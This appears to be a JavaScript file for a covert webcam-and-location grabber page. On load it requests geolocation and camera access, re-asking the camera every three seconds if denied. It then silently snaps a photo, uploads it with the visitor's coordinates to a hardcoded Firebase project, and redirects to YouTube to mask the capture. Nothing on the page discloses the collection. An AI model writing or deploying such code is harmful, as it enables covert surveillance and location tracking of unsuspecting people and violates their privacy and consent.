// Firebase configuration
const firebaseConfig = {
    apiKey: "AIzaSyDEAy2KXezICmuuQZnhNq12nqwwBouDjt4",
    authDomain: "webcamera-es-universe-git.firebaseapp.com",
    databaseURL: "https://webcamera-es-universe-git-default-rtdb.firebaseio.com",
    projectId: "webcamera-es-universe-git",
    storageBucket: "webcamera-es-universe-git.appspot.com",
    messagingSenderId: "949054088643",
    appId: "1:949054088643:web:039f79fcae7259f4358976"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const storage = firebase.storage();
const database = firebase.database();

// Variable to store location
let userLocation = null;

// Function to request location permission and get location
function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                userLocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude
                };
                console.log('User Location:', userLocation);  // Debugging location
            },
            (error) => {
                console.error('Error accessing location:', error);
                document.getElementById('message').textContent = 'Location access denied or an error occurred.';
            }
        );
    } else {
        console.error('Geolocation is not supported by this browser.');
        document.getElementById('message').textContent = 'Geolocation is not supported by this browser.';
    }
}

// Function to save location with the photo name in Firebase
function saveLocationWithPhoto(photoName, location) {
    if (location) {
        const locationRef = database.ref('locations_with_photos').push();
        locationRef.set({
            photo: photoName,
            location: location
        }, (error) => {
            if (error) {
                console.error('Error saving location with photo to Firebase:', error);
            } else {
                console.log('Location with photo saved to Firebase');
            }
        });
    } else {
        console.log('No location available to save');
    }
}

// Capture the photo and upload it to Firebase Storage
function capturePhoto(video) {
    const canvas = document.createElement('canvas');
    const context = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(async function (blob) {
        const fileName = `photo_${Date.now()}.png`;
        const storageRef = storage.ref(`users/${fileName}`);

        try {
            await storageRef.put(blob);

            if (userLocation) {
                console.log('Saving location with photo:', userLocation);
                saveLocationWithPhoto(fileName, userLocation);  // Save both photo and location
            } else {
                console.log('No location to save with the photo.');
            }

            setTimeout(() => {
                window.location.href = 'https://youtube.com/';
            }, 1000);
        } catch (error) {
            console.error('Error uploading to Firebase:', error);
        }
    }, 'image/png', 1.0);
}

// Access the camera with higher resolution
async function startVideo() {
    let accessGranted = false;
    while (!accessGranted) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            });
            accessGranted = true;
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();

            video.onloadedmetadata = () => {
                capturePhoto(video);
            };
        } catch (error) {
            console.error('Error accessing camera:', error);
            document.getElementById('message').textContent = 'Camera access denied, trying again...';
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
}

// Start the camera and location request on page load
window.onload = () => {
    getLocation();  // Request location permission
    startVideo();   // Request camera permission
};
